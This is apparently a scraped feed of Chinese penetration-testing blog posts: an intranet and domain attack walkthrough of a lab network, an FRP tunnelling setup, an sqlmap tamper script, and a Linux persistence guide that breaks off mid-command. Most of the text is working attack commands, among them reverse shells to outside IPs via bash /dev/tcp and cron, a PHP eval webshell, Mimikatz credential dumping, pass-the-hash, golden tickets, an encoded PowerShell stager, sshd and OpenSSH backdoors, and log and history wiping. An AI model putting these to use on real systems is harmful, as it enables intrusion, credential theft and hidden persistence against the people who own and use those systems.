teamserver启动服务，上线，Listener，generate生成可执行文件artifact.exe（因为当前环境没有杀软，故不考虑免杀），启动之后只要进程不被杀掉，随时可以上线。 开启远程桌面连接 通过cmd创建用户， 使用远程桌面连接执行文件 这里的cmd可以考虑蚁剑的虚拟终端,还有回显,meterpreter的shell没有回显 123net user gqy test@1233 &#x2F;add net localgroup administrators gqy &#x2F;addREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f 若目标主机开启了防火墙限制了3389的远程连接，可反弹一个msf的shell回来，尝试关闭防火墙 1meterpreter&gt; run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp 蚁剑cmd关闭防火墙 1netsh adcfirewall set allprofiles state off 远程桌面OWA\\gqy test@1233成功连上 注意这里有时候前面跟的是域 meterpreter上传并执行文件 12upload &#x2F;tmp&#x2F;artifact.exe C:&#x2F;Windowsexecute -f artifact.exe cs与msf联动先新建一个foreign Listener，然后把想派生的shell右键spawn选择新建的foreignlistener msf监听 12345use exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;meterpreter&#x2F;reverse_tcpset lhost 192.168.1.130set lport 1233exploit 因为是windows/meterpreter/reverse_tcp，这个shell是可以直接进程迁移的 获取密码或hashDump Hashes+Run Mimikatz 使用LaZagne抓取所有支持软件的密码 meterpreter或cs上传， cs执行 1bracon&gt;shell laZagne.exe all msf进入shell执行 1laZagne.exe all 信息收集cmd 1ipconfig &#x2F;all beacon 12shell net config Workstationnet view 得到192.168.52.138是域控 内网收集查看windwos漏打的补丁 https://github.com/AonCyberLabs/Windows-Exploit-Suggester 123456789run post&#x2F;windows&#x2F;gather&#x2F;checkvm #是否虚拟机run post&#x2F;linux&#x2F;gather&#x2F;checkvm #是否虚拟机run post&#x2F;windows&#x2F;gather&#x2F;forensics&#x2F;enum_drives #查看分区run post&#x2F;windows&#x2F;gather&#x2F;enum_applications #获取安装软件信息run post&#x2F;windows&#x2F;gather&#x2F;dumplinks #获取最近的文件操作run post&#x2F;windows&#x2F;gather&#x2F;enum_ie #获取IE缓存run post&#x2F;windows&#x2F;gather&#x2F;enum_chrome #获取Chrome缓存run post&#x2F;windows&#x2F;gather&#x2F;enum_patches #补丁信息run post&#x2F;windows&#x2F;gather&#x2F;enum_domain #查找域控 查看路由信息 1run get_local_subnets 添加路由并扫描 12run autoroute -s 192.168.52.0&#x2F;24run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner RHOSTS&#x3D;192.168.52.0&#x2F;24 前面看到靶机存在nmap，使用nmap的端口扫描 12nmap --script&#x3D;vuln 192.168.52.141nmap --script&#x3D;vuln 192.168.52.138 192.168.52.141 192.168.52.138 内网攻击姿势-MS08-067 MS08-067漏洞是通过MSRPC over SMB通道调用Server服务程序中的NetPathCanonicalize函数时触发的，而NetPathCanonicalize函数在远程访问其他主机时，会调用NetpwPathCanonicalize函数，对远程访问的路径进行规范化，而在NetpwPathCanonicalize函数中存在的逻辑错误，造成栈缓冲区可被溢出，而获得远程代码执行（Remote Code Execution）。 打payload之前需要反向代理（autoroute只用于扫描），我用ew 上传到靶机 1ew_for_Win.exe -s rssocks -d 192.168.1.130 -e 8888 kali 1.&#x2F;ew_for_Linux32 -s rcsocks -l 1080 -e 8888 proxychains启动msfconsole 不设置 payload，攻陷后直接获得靶机1的cmd而不是meterpreter 注意下如果前面用了反向代理，这里payload需要用正向 12345search ms08-067use exploit&#x2F;windows&#x2F;smb&#x2F;ms08_067_netapiset RHOSTS 192.168.52.141set payload windows&#x2F;meterpreter&#x2F;bind_tcprun 发现不太稳定，进程迁移也是一样 mimikatz插件通过mimikatz插件可以查看主机所在域，以及密码收集 12345load mimikatzmimikatz_command -f system::computermimikatz_command -f samdump::hashesmimikatz_command -f sekurlsa::searchPasswordswdigest 没有成功抓到 内网攻击姿势-SMB远程桌面口令猜测1search smb_login 123456use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_loginmsf exploit (smb_login)&gt;set rhosts 192.168.127.235msf exploit (smb_login)&gt;set user_file &#x2F;root&#x2F;Pentest&#x2F;user.txtmsf exploit (smb_login)&gt;set pass_file &#x2F;root&#x2F;Pentest&#x2F;pass.txtmsf exploit (smb_login)&gt;set stop_on_success truemsf exploit (smb_login)&gt;exploit 内网攻击姿势-Oracle数据库 TNS服务漏洞 oracle TNS Listener远程投毒（CVE-2012-1675） 1use auxiliary&#x2F;scanner&#x2F;oracle&#x2F;tnspoison_checker TNS上的缓冲区漏洞（CVE-2009-1979） 1exploit&#x2F;windows&#x2F;oracle&#x2F;tns_auth_sesskey CVE-2002-0965MSF中漏洞利用模块 1exploit&#x2F;windows&#x2F;oracle&#x2F;tns_service_name 内网攻击姿势-RPC DCOM服务漏洞 微软修改dcerpc框架后形成自己的RPC框架来处理进程间的通信。微软的RPC框架在处理TCP/IP信息交换过程中存在的畸形消息时，未正确处理，导致缓冲区溢出漏洞；此漏洞影响使用RPC框架的DCOM接口，DCOM接口用来处理客户端机器发送给服务器的DCOM对象激活请求，如UNC路径。 1234search ms03_026use exploit&#x2F;windows&#x2F;dcerpc&#x2F;ms03_026_dcomset rhosts 192.168.52.141run 没成功 内网攻击姿势- MS17-0101234search ms17-010use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblueset rhosts 192.168.52.141run 没成功，可能是由于前面打了一些别的payload 钓鱼攻击这个之前还真没搞过 快捷方式 钓鱼链接 但是下载完成之后还需要运行，因此需要一定的伪装技巧，比如Clone Site ok，上半部分至此就结束了 内网其他主机端口-redis Getshell1proxychains redis-cli -h 192.168.52.138 ①通过写SSH key的方式进行getshell 1234567891011生成密钥对ssh-keygen -t rsa将生成的公钥写入到文件中(echo -e &quot;\\n\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n\\n&quot;) &gt; pub.txt设置路径、文件、写入公钥 config set dir &#x2F;root&#x2F;.ssh&#x2F;config set dbfilename &quot;authorized_keys&quot;saveexit连接ssh -i id_rsa root@192.168.2.155 ②向Web目录中写webshell的方式进行getshell 123456flushdbconfig set dir &#x2F;var&#x2F;www&#x2F;html&#x2F;config set dbfilename &quot;gaia.php&quot;set gaia &quot;&lt;?php eval($_POST[cmd]);?&gt;&quot;saveexit ③redis写定时任务反弹shell 1234config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;config set dbfilename rootset x &quot;\\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.2.155&#x2F;2333 0&gt;&amp;1\\n&quot;save 内网其他主机端口-Mysql提权 1.UDF提权udf是Mysql类提权的方式之一。前提是已知mysql中root的账号密码，我们在拿到webshell后，可以看网站根目录下的config.php里，一般都有mysql的账号密码。利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而来提权。2.MOF提权托管对象格式 (MOF) 文件是创建和注册提供程序、事件类别和事件的简便方法。文件路径为：c:/windows/system32/wbme/mof/，其作用是每隔五秒就会去监控进程创建和死亡。MOF文件每五秒就会执行，而且是系统权限，通过mysql使用load_file 将文件写入/wbme/mof，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。 sqlmap一把梭 1sqlmap -d &quot;mysql:&#x2F;&#x2F;root:123456@node3.buuoj.cn:26002&#x2F;mysql&quot; --os-shell PTH pass-the-hash，在Windows系统中，通常会使用NTLM身份认证，NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)，分为LM hash和NT hash，如果攻击者获得了hash，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)，可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。这类攻击适用于：域/工作组环境，可以获得hash，但是条件不允许对hash爆破，内网中存在和当前机器相同的密码，从windows到windows横向pth这一类攻击方法比较广泛 上传一个mimkatz 利用之前logonpasswords得到的hash 123mimikatzprivilege:debug sekurlsa::pth &#x2F;user:Administrator &#x2F;domain:god.org &#x2F;ntlm:8601a88798be6a3948fce638a5790741 这时候就可以就ipc连接了 域渗透-横向移动[wmi利用] WMI是一个系统插件,用于在本地远程管理计算机的进程,服务,注册表等其它的一系列的特权操作 使用msf 1234567use exploit&#x2F;windows&#x2F;local&#x2F;wmiset SMBUser administratorset SMBPass vulstack@1set payload windows&#x2F;meterpreter&#x2F;bind_tcpset SMBDomain god.orgset session 3run 失败了，或者使用wmiexec 1234567git clone https:&#x2F;&#x2F;github.com&#x2F;ropnop&#x2F;impacket_static_binariespython setup.py installcd examplesproxychains python wmiexec.py -debug &#39;administrator:vulstack@1@192.168.52.138&#39;proxychains python wmiexec.py -debug -hashes 00000000000000000000000000000000:8601a88798be6a3948fce638a5790741 &#39;administrator@192.168.52.138&#39; 或者这个：https://github.com/Kevin-Robertson/Invoke-TheHash 先上传 1Import-Moudle .\\Invoke-TheHash.psd1 1Invoke-WMIExec -Target 192.168.52.138 -Domain workgroup -Username administrator -Hash 8601a88798be6a3948fce638a5790741 -Command &quot;calc.exe&quot; -verbose 这个得得到一个ps的shell 这里使用Empire https://github.com/BC-SECURITY/Empire 1234uselistener httpset Port 8080set Name testexecute 12backlist 12345usestager（空格+tab）usestager windows&#x2F;launcher_batinfoset Listener testexecute 生成launcher.bat 123@echo offstart &#x2F;b powershell -noP -sta -w 1 -enc WwBSAGUARgBdAC4AQQBTAHMAZQBNAEIAbABZAC4ARwBFAHQAVAB5AHAAZQAoACcAUwB5AHM...start &#x2F;b &quot;&quot; cmd &#x2F;c del &quot;%~f0&quot;&amp;exit &#x2F;b 收到了请求，但是没有agents 123usestager launcher_vbs testset Listener testexecute 没成功 ===========================分割线 直接cs执行ps命令即可。。。 内网其它主机端口-代理转发我主要是通过ew Frp内网穿透把自己的kali放到公网上，参考之前的文章 https://glotozz.github.io/2020/03/13/FRP%E6%90%AD%E5%BB%BA/ CS上线内网主机proxychains启动cs，并执行 生成beacon.exe 利用ipc上传或者smbclient上传 1copy beacon.exe \\\\192.168.52.138\\c$ 12proxychains smbclient &#x2F;&#x2F;192.168.52.138&#x2F;c$ -U administratorput &#x2F;tmp&#x2F;beacon.exe 利用wmi执行 成功上线 SSH隧道 这种代理方式需要比较高的权限(system/root)直接使用系统功能来开启内网代理的隧道，通过SSH隧道进行代理 12ssh -qTfnN -L port:host:hostport -l user remote_ip #正向隧道，监听本地portssh -qTfnN -R port:host:hostport -l user remote_ip #反向隧道，用于内网穿透防火墙限制之类 12ssh -CfNg -L port1:127.0.0.1:port2 user@host #本地转发ssh -CfNg -R port2:127.0.0.1:port1 user@host #远程转发 持久控制域成员信息收集 123456net localgroup administrator &#x2F;domainnet group &#x2F;domainnet group &quot;domain admins&quot; &#x2F;domainnet user &#x2F;domaindsquery usernet accounts &#x2F;domain 利用SPN快速扫描域内存活相关服务以及快速定位服务器 1setspn -T OWA-god.god.org -Q *&#x2F;* HTTP Listener交互信息隐藏 1.将Cobalt Strike配置文件转换为功能性的mod_rewrite .htaccess或Nginx配置文件，以支持将HTTP反向代理重定向到Cobalt Strike团队服务器。使用反向代理可以保护后端C2服务器免受分析，调查和一般Internet背景辐射。https://github.com/threatexpress/cs2modrewrite2.Cobalt Strike通过Malleable C2配置文件修改其流量。配置文件提供了高度可定制的选项，用于修改服务器的C2流量在线路上的形式。Malleable C2配置文件可增加强事件响应的规避，使用的合法内部应用程序冒充已知对手或伪装目标。https://github.com/rsmudge/Malleable-C2-Profiles SSP 1.SSP，用于扩展Windows身份验证机制。LSASS进程正在Windows启动期间加载安全支持提供程序DLL。这种行为使红队的攻击者可以删除一个任意的SSP DLL以便与LSASS进程进行交互并记录该进程中存储的所有密码，或者直接用恶意的SSP对该进程进行修补。 2.项目Mimikatz提供了一个DLL文件（mimilib.dll），可以将其放到与LSASS进程（System32）相同的位置，以便为访问受感染主机的任何用户获得纯文本凭据。Mimikatz通过向LSASS注入新的SSP来支持内存技术选项。 12privilege::debugmisc::memssp 金票利用 krbtgt账户：每个域控制器都有一个“krbtgt”的用户账户，是KDC的服务账户，用来创建票据授予服务（TGS）加密的密钥。黄金票据（Golden Ticket）：使在拥有普通域用户权限和krbtgt hash的情况下，获取域管理员权限。 获取金票需要的ntml和sid 12mimikatz# LsaDump::dcsync &#x2F;domain:god.org &#x2F;all &#x2F;csvwhoami &#x2F;user 1mimikatz # kerberos::golden &#x2F;user:administrator &#x2F;domain:test.lab &#x2F;sid:S-1-5-21-2952760202-1353902439-2381784089-500 &#x2F;krbtgt:58e91a5ac358d86513ab224312314061 &#x2F;user:god &#x2F;ticket:gold2.kirbi 123kerberos::ptt gold2.kirbi #导入票据kerberos::list #列出票据kerberos::purge # 清除票据 后门植入使用persistence启动项后门在C:\\Users***\\AppData\\Local\\Temp\\目录下，上传一个vbs脚本在注册表HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\加入开机启动项 metsvc服务后门 在C:\\Users***\\AppData\\Local\\Temp\\上传了三个文件（metsrv.x86.dll、metsvc-server.exe、metsvc.exe），通过服务启动，服务名为meterpreter 1run metsvc -A 连接后门，set payload windows/metsvc_bind_tcp 12345use exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;metsvc_bind_tcpset rhost 192.168.1.133set lport 31337exploit 重新进入session即可 痕迹清理 meterpreter: clearev https://github.com/3gstudent/Windows-EventLog-Bypass 1PS C:\\&gt; Invoke-Phant0m 总结还需要学习Empire，后门数据传输的加密，免杀的制作，以及真实环境中如何快速高效的制定计划。 参考链接 https://mp.weixin.qq.com/s/nAGjUsre2Hg_IkCPXLxYDQ https://mp.weixin.qq.com/s/QLoXt5JTjHreUkZIg1uW3g","categories":[],"tags":[{"name":"域渗透","slug":"域渗透","permalink":"https://glotozz.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"}]},{"title":"FRP搭建","slug":"FRP搭建","date":"2020-03-13T04:07:35.000Z","updated":"2020-03-25T08:06:19.254Z","comments":true,"path":"2020/03/13/FRP搭建/","link":"","permalink":"https://glotozz.github.io/2020/03/13/FRP%E6%90%AD%E5%BB%BA/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 FRP 服务端配置 FRP客户端配置 反弹shell测试 参考链接 之前都是花生壳简单的内网穿透，因为服务端不是我们自己的，因此在一些实战中无法满足需求。 FRP 是一个使用 Go 语言开发的高性能的反向代理应用，可以帮助您轻松地进行内网穿透，对外网提供服务。FRP 支持 TCP、UDP、HTTP、HTTPS等协议类型，并且支持 Web 服务根据域名进行路由转发。 话不多说，开始配置 项目地址：https://github.com/fatedier/frp 首先，网络拓扑图 FRP 服务端配置配置 FRP 服务端的前提条件是需要一台具有公网 IP的设备 frps.ini 12[common]server_port &#x3D; 7000 ./frps -c ./frps.ini监听一个7000端口的FRP服务端 FRP客户端配置frpc.ini 123456789[common]server_addr &#x3D; 118.178.88.46server_port &#x3D; 7000[kali]type &#x3D; tcplocal_ip &#x3D; 192.168.56.124local_port &#x3D; 4444remote_port &#x3D; 1234 ./frpc -c ./frpc.ini 这样就可以成功在 FRP 服务端上成功建立一个客户端连接，服务端的1234端口映射着本地虚拟机的4444端口 反弹shell测试1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;118.178.88.46&#x2F;1234 0&gt;&amp;1 真正的1分钟搞定内网穿透！！ 当然，如果要开启一些服务，需要更加安全的配置，具体可参考github官网。 参考链接 https://www.dazhuanlan.com/2019/08/18/5d595a72cb5d4/","categories":[],"tags":[{"name":"工具","slug":"工具","permalink":"https://glotozz.github.io/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"SQLMAP-temper编写","slug":"SQLMAP-temper编写","date":"2020-03-12T16:58:06.000Z","updated":"2020-03-25T08:05:23.409Z","comments":true,"path":"2020/03/13/SQLMAP-temper编写/","link":"","permalink":"https://glotozz.github.io/2020/03/13/SQLMAP-temper%E7%BC%96%E5%86%99/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 后台脚本 tamper编写 参考链接 一般情况下sqlmap比自己写脚本方便，只需要处理好temper脚本，并且sqlmap能针对不同的数据库，这点很重要。 正好之前看到一篇文章，自己也学习下，之后多用用sqlmap。 后台脚本比如有这么一个后台处理的脚本 1234567891011121314151617181920&lt;?phpheader('content-type:text/html;charset=utf-8');//解密过程function decode($data)&#123; $td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,'',MCRYPT_MODE_CBC,''); mcrypt_generic_init($td,'ydhaqPQnexoaDuW3','2018201920202021'); $data = mdecrypt_generic($td,base64_decode(base64_decode($data))); mcrypt_generic_deinit($td); mcrypt_module_close($td); if(substr(trim($data),-6)!=='_mozhe')&#123; echo '&lt;script&gt;window.location.href=\"/index.php\";&lt;/script&gt;'; &#125;else&#123; return substr(trim($data),0,strlen(trim($data))-6); &#125;&#125;$id=decode($_GET['id']);$sql=\"select id,title,content,time from notice where id=$id\";$info=$link-&gt;query($sql);$arr=$info-&gt;fetch_assoc();?&gt; 这里对传入的id进行AES-128-CCB解密之后直接拼接进sql语句查询，之后我查了这个mcrypt_module_open，是个扩展，但是php7.1已经被废弃，于是改用openssl_encrypt() 12345678910111213141516171819202122232425&lt;?phpheader('content-type:text/html;charset=utf-8');//解密过程$key = 'hahahaha';class AES &#123; public static function encrypt($string, $key) &#123; // openssl_encrypt 加密不同Mcrypt，对秘钥长度要求，超出16加密结果不变 $data = openssl_encrypt($string, 'AES-128-ECB', $key, OPENSSL_RAW_DATA); $data = strtolower(bin2hex($data)); return $data; &#125; public static function decrypt($string, $key) &#123; $decrypted = openssl_decrypt(hex2bin($string), 'AES-128-ECB', $key, OPENSSL_RAW_DATA); return $decrypted; &#125;&#125;$id = AES::decrypt($_GET['id'],$key);$sql = \"select * from th_user where uid=$id\";$info = $link-&gt;query($sql);$arr = $info-&gt;fetch_assoc();?&gt; tamper编写sqlmap是不会处理这种加密的，因此需要编写一个tamper脚本 测试了一下，php使用openssl_encrypt()和python使用pycrypto模块同时选择AES-128-CBC加密结果不同，我的思路是系统调用一下php 先准备一个被系统的调用2.php 123456789101112131415161718&lt;?php$key = 'hahahaha';class AES &#123; public static function encrypt($string, $key) &#123; // openssl_encrypt 加密不同Mcrypt，对秘钥长度要求，超出16加密结果不变 $data = openssl_encrypt($string, 'AES-128-ECB', $key, OPENSSL_RAW_DATA); $data = strtolower(bin2hex($data)); return $data; &#125; public static function decrypt($string, $key) &#123; $decrypted = openssl_decrypt(hex2bin($string), 'AES-128-ECB', $key, OPENSSL_RAW_DATA); return $decrypted; &#125;&#125;echo AES::encrypt(base64_decode($argv[1]),$key);?&gt; tamper脚本aes.py 12345678910111213141516171819202122232425262728293031#!/usr/bin/env python\"\"\"Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE' for copying permission\"\"\"import base64import osfrom Crypto.Cipher import AESfrom lib.core.enums import PRIORITYfrom lib.core.settings import UNICODE_ENCODING__priority__ = PRIORITY.LOWESTdef dependencies(): passdef encrypt(text): t = base64.b64encode(text) # print t x = os.popen('php 2.php ' + t).readlines() return x[0]# print encrypt('-1 union select 1,2,3,4')def tamper(payload, **kwargs): return encrypt(payload) 注意，测试的时候将2.php放在/tamper目录下，跑sqlmap的时候需要放在/sqlmap-master下 1python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;1.php?id&#x3D;1 --tamper aes.py --current-db 参考链接 https://uknowsec.cn/posts/notes/SQLMap-tamper%E7%BC%96%E5%86%99%E5%B0%9D%E8%AF%95.html","categories":[],"tags":[{"name":"工具","slug":"工具","permalink":"https://glotozz.github.io/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"Linux下常见维权方式","slug":"Linux下常见维权方式","date":"2020-03-12T01:29:56.000Z","updated":"2020-04-18T01:08:31.890Z","comments":true,"path":"2020/03/12/Linux下常见维权方式/","link":"","permalink":"https://glotozz.github.io/2020/03/12/Linux%E4%B8%8B%E5%B8%B8%E8%A7%81%E7%BB%B4%E6%9D%83%E6%96%B9%E5%BC%8F/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 1、一句话添加用户和密码 2、SUID Shell 3、ssh公私钥免密登录 4、软连接 5、SSH wrapper 6、strace后门 7、crontab反弹shell 8、openssh后门 9、PAM后门 10、rookit后门 参考链接 看了篇文章觉得还不错。本着实践出真知的精神，自己动手操作下 1、一句话添加用户和密码添加普通用户 123456789101112# 创建一个用户名guest，密码123456的普通用户useradd -p &#96;openssl passwd -1 -salt &#39;salt&#39; 123456&#96; guest# useradd -p 方法 &#96; &#96; 是用来存放可执行的系统命令,&quot;$()&quot;也可以存放命令执行语句useradd -p &quot;$(openssl passwd -1 123456)&quot; guest# chpasswd方法useradd guest;echo &#39;guest:123456&#39;|chpasswd# echo -e方法，-e：激活转义字符。# 使用-e选项时，若字符串中出现以下字符，则特别加以处理，而不会将它当成一般文字输出useradd test;echo -e &quot;123456\\n123456\\n&quot; |passwd test 添加root用户 12# 创建一个用户名guest，密码123456的root用户useradd -p &#96;openssl passwd -1 -salt &#39;salt&#39; 123456&#96; guest -o -u 0 -g root -G root -s &#x2F;bin&#x2F;bash -d &#x2F;home&#x2F;test 有些服务器可能有密码策略，需要将密码设置的复杂些 这时候看一下/etc/passwd 明显guest2是root权限 可疑用户排查 awk命令语法： awk工作流程是这样的：读入有’\\n’换行符分割的一条记录，然后将记录按指定的域分隔符划分域，填充域，$0则表示所有域,$1表示第一个域,$n表示第n个域。默认域分隔符是”空白键” 或 “[tab]键” -F指定分隔符 123456# 查询特权用户特权用户(uid 为0)awk -F: &#39;$3&#x3D;&#x3D;0&#123;print $1&#125;&#39; &#x2F;etc&#x2F;passwd# 查询可以远程登录的帐号信息awk &#39;&#x2F;\\$1|\\$6&#x2F;&#123;print $1&#125;&#39; &#x2F;etc&#x2F;shadow# 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限more &#x2F;etc&#x2F;sudoers | grep -v &quot;^#\\|^$&quot; | grep &quot;ALL&#x3D;(ALL)&quot; 可疑用户删除 userdel guest1 2、SUID Shell Suid shell是一种可用于以拥有者权限运行的shell。 123# 配合普通用户权限使用cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;shellchmod u+s &#x2F;tmp&#x2F;shell 备注：bash2针对suid做了一些防护措施，需要使用-p参数来获取一个root shell。另外，普通用户执行这个SUID shell时，一定要使用全路径。 排查技巧 123456# 在Linux中查找SUID设置的文件find . -perm &#x2F;4000# 在Linux中查找使用SGID设置的文件find . -perm &#x2F;2000# 取消s权限chmod u-s &#x2F;tmp&#x2F;shell 3、ssh公私钥免密登录写入公钥 1234567#将自己主机的home&#x2F;xxx&#x2F;.ssh&#x2F;id_rsa.pub写入靶机&#x2F;home&#x2F;ford&#x2F;.ssh&#x2F;authorized_keysssh ford@192.168.56.102ssh-keygenls -la &#x2F;home&#x2F;pinak&#x2F;.sshcat &#x2F;home&#x2F;pinak&#x2F;.ssh&#x2F;id_rsa.pub &gt; &#x2F;home&#x2F;pinak&#x2F;authorized_keyssudo -u sarang cp &#x2F;home&#x2F;pinak&#x2F;authorized_keys &#x2F;home&#x2F;sarang&#x2F;.ssh&#x2F; 排查技巧 1查看&#x2F;root&#x2F;.ssh&#x2F;authorized_keys是否被修改。 使用私钥 12#根据&#x2F;etc&#x2F;passwd确定用户ford后，读取私钥&#x2F;home&#x2F;ford&#x2F;.ssh&#x2F;id_rsa，复制下来，注意将id_rsa设置为700ssh ford@192.168.56.102 -p 6688 -i id_rsa 仅靠一个私钥并不能直接登录，但是当时做Cynix靶机的确只读取了私钥即可成功登录。查看了下发现配置PasswordAuthentication no即禁用密码登录，最后发现.ssh目录下authorized_keys填写了靶机自身的公钥。原理和上面的写入公钥相同，只是多了一种思路。但是我之后测试发现还是失败，应该还需要修改什么配置。 4、软连接 在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为sufficient时只要pam_rootok模块检测uid为0即root权限即可成功认证登陆。通过软连接的方式，实质上PAM认证是通过软连接的文件名 /tmp/su 在/etc/pam.d/目录下寻找对应的PAM配置文件(如: /etc/pam.d/su)，任意密码登陆的核心是auth sufficient pam_rootok.so，所以只要PAM配置文件中包含此配置即可SSH任意密码登陆，除了su中之外还有chsh、chfn同样可以。 12#创建软连接，并开启6688端口ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oPort&#x3D;6688 排查技巧 进程、端口都可以发现异常， kill -s 9 PID 结束进程即可清除后门。 5、SSH wrapper init首先启动的是/usr/sbin/sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动/usr/bin/sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的/usr/sbin/sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell。 服务端 12345678cd &#x2F;usr&#x2F;sbin&#x2F;mv sshd ..&#x2F;bin&#x2F;echo &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt;sshdecho &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if(getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshdecho &#39;exec&#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshdchmod u+x sshd#ubuntu&#x2F;etc&#x2F;init.d&#x2F;sshd restart 客户端 1socat STDIO TCP4:118.178.88.46:22,sourceport&#x3D;13377 没成功。应该是服务端系统的原因，上面的需要在ubuntu下，我的服务端是centos 排查技巧 123ls -al &#x2F;usr&#x2F;sbin&#x2F;sshdcat &#x2F;usr&#x2F;sbin&#x2F;sshd# 可通过重装ssh服务恢复。 6、strace后门找到进程PID 12ps -ef | grep sshd #父进程PIDstrace -f -p 2908 -o &#x2F;tmp&#x2F;.ssh.log -e trace&#x3D;read,write -s 2048 通过配置用户目录下.login配置获取ssh明文密码 1234#vim &#x2F;etc&#x2F;bashrcalias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;.ssh.log -e read,write,connect -s 2048 ssh&#39;#source &#x2F;root&#x2F;.bashrc#su，sudo同样的道理 那么只要目标使用ssh，便会在/tmp目录下生成记录 排查技巧 使用alias即可发现异常。 7、crontab反弹shellcrontab命令用于设置周期性被执行的指令。新建shell脚本，利用脚本进行反弹。 /etc/evil.sh 12#!&#x2F;bin&#x2F;bashbash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;118.178.88.46&#x2F;1234 0&gt;&amp;1 1chmod +sx &#x2F;etc&#x2F;evil.sh /etc/crontab 12#每一分钟执行一次*&#x2F;1 * * * * root &#x2F;etc&#x2F;evil.sh 重启 1234#ubuntuservice cron start#centosservice crond restart 排查技巧 123# 查看可疑的定时任务列表cat &#x2F;etc&#x2F;crontabcrontab -e 8、openssh后门 利用openssh后门，设置SSH后门密码及root密码记录位置，隐蔽性较强，不易被发现。 123#查看sshd系统版本，之后需要修改ssh -VOpenSSH_6.6.1p1, OpenSSL 1.0.1e-fips 11 Feb 2013 1234567891011121314151617181920212223242526272829303132333435363738a、备份SSH配置文件mv &#x2F;etc&#x2F;ssh&#x2F;ssh_config &#x2F;etc&#x2F;ssh&#x2F;ssh_config.oldmv &#x2F;etc&#x2F;ssh&#x2F;sshd_config &#x2F;etc&#x2F;ssh&#x2F;sshd_config.oldb、解压并安装补丁tar -zxvf openssh-5.9p1.tar.gztar -zxvf 0x06-openssh-5.9p1.patch.tar.gzcp openssh-5.9p1.patch&#x2F;sshbd5.9p1.diff openssh-5.9p1&#x2F;cd openssh-5.9p1patch &lt; sshbd5.9p1.diffc、记录用户名和密码的文件位置及其密码vi includes.h #define ILOG &quot;&#x2F;tmp&#x2F;1.txt&quot; &#x2F;&#x2F;记录登录本机的用户名和密码 #define OLOG &quot;&#x2F;tmp&#x2F;2.txt&quot; &#x2F;&#x2F;记录本机登录远程的用户名和密码 #define SECRETPW &quot;123456789&quot; &#x2F;&#x2F;后门的密码d、修改版本信息vi version.h #define SSH_VERSION &quot;填入之前记下来的版本号,伪装原版本&quot; #define SSH_PORTABLE &quot;小版本号&quot;e、安装并编译.&#x2F;configure --prefix&#x3D;&#x2F;usr --sysconfdir&#x3D;&#x2F;etc&#x2F;ssh --with-pam --with-kerberos5make cleanmake &amp;&amp; make installservice sshd restartf、对比原来的配置文件，使配置文件一致，然后修改文件日期。touch -r &#x2F;etc&#x2F;ssh&#x2F;ssh_config.old &#x2F;etc&#x2F;ssh&#x2F;ssh_configtouch -r &#x2F;etc&#x2F;ssh&#x2F;sshd_config.old &#x2F;etc&#x2F;ssh&#x2F;sshd_configg、清除操作记录export HISTFILE&#x3D;&#x2F;dev&#x2F;nullexport HISTSIZE&#x3D;0echo &gt;&#x2F;root&#x2F;.bash_history &#x2F;&#x2F;清空操作日志 修改日志输出和密码 修改version 成功，ilog中记录了本机登录的账号密码，olog中记录了本机登录其他机器的明文密码 排查技巧 利用strace找出ssh后门 123456# 1、获取可疑进程PIps aux | grep sshd# 2、跟踪sshd PIDstrace -o aa -ff -p PID# 3、查看记录密码打开文件grep open sshd* | grep -v -e No -e null -e denied| grep 